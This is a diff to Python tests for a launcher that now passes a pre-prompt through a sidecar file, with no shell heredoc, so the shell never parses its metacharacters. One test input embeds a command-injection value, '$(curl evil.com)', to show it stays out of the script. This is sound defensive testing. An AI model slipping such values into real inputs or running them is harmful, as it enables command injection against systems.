@@ -539,11 +539,13 @@ def test_validate_pre_prompt_accepts_short_text():
     assert reason == ""
 
 
-def test_validate_pre_prompt_rejects_text_containing_heredoc_tag():
-    body = "brief ... SULIS_PROMPT_EOF ... more"
-    ok, reason = tl._validate_pre_prompt(body)
-    assert ok is False
-    assert reason
+def test_validate_pre_prompt_allows_former_heredoc_tag_text():
+    # Since #86 the pre_prompt is delivered via a sidecar file, never a
+    # heredoc — so text that happens to mention the old tag is no longer
+    # dangerous and must NOT be rejected (its bytes are never shell-parsed).
+    ok, reason = tl._validate_pre_prompt("brief ... SULIS_PROMPT_EOF ... more")
+    assert ok is True
+    assert reason == ""
 
 
 def test_validate_pre_prompt_rejects_oversize():
@@ -562,25 +564,49 @@ def test_build_launch_script_no_pre_prompt_byte_identical_to_baseline(tmp_path):
     assert baseline == with_none
 
 
-def test_build_launch_script_with_pre_prompt_uses_quoted_heredoc(tmp_path):
+def test_build_launch_script_with_pre_prompt_reads_sidecar(tmp_path):
     script = tl._build_launch_script(
         _GOOD_ULID, tmp_path, pre_prompt="hello world",
     )
-    assert "<<'SULIS_PROMPT_EOF'" in script
-    # closing tag on its own line
-    assert "\nSULIS_PROMPT_EOF\n" in script
+    # Delivered via a sidecar file read at runtime, NOT a heredoc (#86).
+    assert "<<'SULIS_PROMPT_EOF'" not in script
+    assert tl._PRE_PROMPT_SIDECAR in script        # references pre_prompt.txt
+    assert '"$(cat ' in script                      # captured as one argv element
 
 
-def test_build_launch_script_pre_prompt_body_verbatim(tmp_path):
+def test_build_launch_script_pre_prompt_not_inline(tmp_path):
+    # The brief is NOT embedded in the script (it lives in the sidecar), so
+    # bash never parses its bytes — shell metacharacters are inert (#86).
     body = "Brief with $HOME and `backticks` and $(curl evil.com) inside."
     script = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=body)
-    assert body in script
+    assert body not in script
+
+
+def test_build_launch_script_parses_under_bash_with_tricky_chars(tmp_path):
+    # The #86 regression: an apostrophe in the brief killed the launch under
+    # macOS bash 3.2 (a quoted heredoc nested in "$(...)" mis-parses the
+    # apostrophe as an unterminated quote). The generated script MUST parse
+    # (bash -n) with apostrophes, double-quotes, backticks and $ present.
+    import shutil
+    import subprocess
+    bash = shutil.which("bash")
+    if bash is None:
+        pytest.skip("bash not available")
+    body = ("render each change's data contract; say \"hi\"; `backtick`; "
+            "$HOME; it's done -> next steps")
+    script = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=body)
+    sh = tmp_path / "launch.sh"
+    sh.write_text(script)
+    r = subprocess.run([bash, "-n", str(sh)], capture_output=True, text=True)
+    assert r.returncode == 0, f"launch.sh has a syntax error: {r.stderr}"
 
 
 def test_build_launch_script_invokes_pre_prompt_validator(tmp_path):
+    # The remaining guard is size; an oversize brief still raises.
     with pytest.raises(ValueError):
         tl._build_launch_script(
-            _GOOD_ULID, tmp_path, pre_prompt="oops SULIS_PROMPT_EOF oops",
+            _GOOD_ULID, tmp_path,
+            pre_prompt="x" * (tl._PRE_PROMPT_MAX_BYTES + 1),
         )
 
 
@@ -593,3 +619,16 @@ def test_launch_change_terminal_forwards_pre_prompt(tmp_path, monkeypatch):
                               wraps=tl._build_launch_script) as b:
         tl.launch_change_terminal(_GOOD_ULID, tmp_path, pre_prompt="hello")
     assert b.call_args.kwargs.get("pre_prompt") == "hello" or "hello" in b.call_args[0]
+
+
+def test_launch_change_terminal_writes_pre_prompt_sidecar(tmp_path, monkeypatch):
+    # The brief lands in the sidecar file the exec line reads, with its exact
+    # bytes (apostrophes/quotes/backticks included) — never inline (#86).
+    monkeypatch.setenv("HOME", str(tmp_path))
+    body = "render each change's contract -- apostrophe, \"quote\", `tick`"
+    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
+            mock.patch.object(tl, "_launch_macos",
+                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
+        tl.launch_change_terminal(_GOOD_ULID, tmp_path, pre_prompt=body)
+    sidecar = tl._change_dir(_GOOD_ULID) / tl._PRE_PROMPT_SIDECAR
+    assert sidecar.read_text() == body
